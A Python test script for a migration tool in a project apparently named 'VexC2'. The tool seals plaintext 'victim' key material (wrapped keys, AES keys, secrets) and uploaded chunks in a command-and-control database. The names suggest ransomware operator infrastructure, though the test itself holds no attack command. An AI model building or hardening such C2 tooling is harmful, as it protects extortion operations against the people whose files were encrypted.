#!/usr/bin/env python3
"""Tests for tools/vault_seal_plaintext.py (temp dirs only)."""
import base64
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "VexC2"))
TOOL = os.path.join(ROOT, "tools", "vault_seal_plaintext.py")
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def main() -> int:
    base = tempfile.mkdtemp(prefix="vex_vault_mig_")
    db = os.path.join(base, "c2.db")
    uploads = os.path.join(base, "uploads")
    backup = os.path.join(base, "backup")
    master = os.path.join(base, ".master")
    os.environ.update({
        "VEX_DB": db,
        "VEX_MASTER_FILE": master,
        "VEX_UPLOADS": uploads,
        "VEX_PRIV": os.path.join(ROOT, "VexC2", "priv.pem"),
        "VEX_SECRET": "t" * 64,
        "VEX_NO_HOUSEKEEPING": "1",
    })
    os.makedirs(uploads, exist_ok=True)
    with open(master, "w", encoding="utf-8") as f:
        f.write("staging-master-" + base64.b64encode(os.urandom(24)).decode())
    import c2db
    import vault
    c2db.init_db()
    vid = "vaultmig0000001"
    with c2db.db() as conn:
        conn.execute("INSERT INTO victims (vid, wrapped_key, aes_key, secret, "
                     "hostname, status, timestamp) VALUES (?,?,?,?,?,?,?)",
                     (vid, "wrapped-plain", "aes-plain", "secret-plain",
                      "MIG", "encrypted", c2db.now()))
        conn.commit()
    open(os.path.join(uploads, ".v2_1_0"), "w", encoding="utf-8").write(
        base64.b64encode(b"migration-chunk").decode())

    def run(*args):
        return subprocess.run([sys.executable, TOOL, "--db", db,
                               "--uploads", uploads, "--master-file", master,
                               *args],
                              capture_output=True, text=True, encoding="utf-8",
                              errors="replace")

    r = run("--apply")
    ok("apply requires backup", r.returncode == 2, r.returncode)
    r = run("--apply", "--backup-dir", backup)
    ok("apply succeeds", r.returncode == 0, r.stdout[-300:])
    with c2db.db() as conn:
        row = conn.execute("SELECT wrapped_key, aes_key, secret FROM victims "
                           "WHERE vid=?", (vid,)).fetchone()
    ok("victim keys sealed", all(vault.is_sealed(v) for v in row))
    ok("victim keys reveal", all(vault.reveal(v) for v in row))
    chunk = open(os.path.join(uploads, ".v2_1_0"), encoding="utf-8").read()
    ok("chunk sealed", vault.is_sealed(chunk))
    ok("chunk reveals", bool(vault.reveal(chunk)))

    r = run("--apply", "--backup-dir", backup)
    ok("second apply idempotent", r.returncode == 0
       and "nothing to migrate" in r.stdout, r.stdout[-200:])

    with open(os.path.join(uploads, ".v2_9_0"), "w", encoding="utf-8") as f:
        f.write("enc:v1:AAAA")
    r = run("--apply", "--backup-dir", backup)
    ok("unreadable chunk aborts by default", r.returncode == 3, r.returncode)
    r = run("--apply", "--backup-dir", backup, "--allow-unreadable-chunks")
    ok("known orphan can be skipped", r.returncode == 0, r.stdout[-300:])

    shutil.rmtree(base, ignore_errors=True)
    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
